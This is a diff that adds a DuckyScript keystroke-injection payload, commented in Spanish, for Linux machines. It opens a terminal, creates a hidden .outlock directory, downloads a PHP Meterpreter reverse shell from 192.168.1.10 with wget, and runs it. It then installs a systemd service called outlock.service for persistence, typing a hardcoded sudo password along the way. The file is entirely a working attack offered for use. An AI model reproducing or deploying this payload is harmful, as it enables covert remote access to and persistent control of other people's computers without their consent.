@@ -1,0 +1,41 @@
+REM Title: Reverse-Shell PHP + Permanencia
+REM Author: Sergio Cabello
+REM Description: Payload que coloca una Reverse-Shell PHP en sistemas linux mediante Metasploit para crear el payload usa el modulo php/meterpreter/reverse_tcp. Coloca permamencia mediante la creación de un servicio llamado outlock.service
+DELAY 3000
+CONTROL ALT T
+DELAY 1000
+STRING mkdir .outlock
+ENTER
+DELAY 500
+STRING cd .outlock
+ENTER
+DELAY 500
+STRING wget http://192.168.1.10/payloads/reverse.php
+ENTER
+DELAY 1000
+STRING chmod +x reverse.php
+ENTER
+DELAY 1000
+STRING php reverse.php
+ENTER
+DELAY 500
+CONTROL ALT T
+DELAY 1000
+STRING echo -e "[Unit]\nDescription=My PHP Service\n\n[Service]\nExecStart=/usr/bin/php /home/sergio/.outlock/reverse.php\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target" > outlock.service
+ENTER
+DELAY 500
+STRING sudo mv outlock.service /etc/systemd/system/outlock.service
+ENTER
+DELAY 500
+STRING Oigres
+ENTER
+DELAY 500
+STRING sudo systemctl daemon-reload
+ENTER
+DELAY 500
+STRING sudo systemctl restart outlock.service
+ENTER
+DELAY 500
+STRING sudo systemctl enable outlock.service
+ENTER
+DELAY 500
